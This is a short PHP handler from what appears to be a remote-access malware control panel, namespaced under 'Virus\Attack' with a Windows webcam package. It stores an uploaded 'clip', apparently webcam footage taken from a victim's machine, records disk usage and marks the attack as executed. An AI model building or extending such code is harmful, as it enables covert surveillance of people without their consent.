<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\Webcam\Webcam $this */

$this->requestData->moveFile("clip", $this->getClipPath());
$this->usage()->setDisk(filesize($this->getClipPath()))->saveState();
$this->setExecuted();
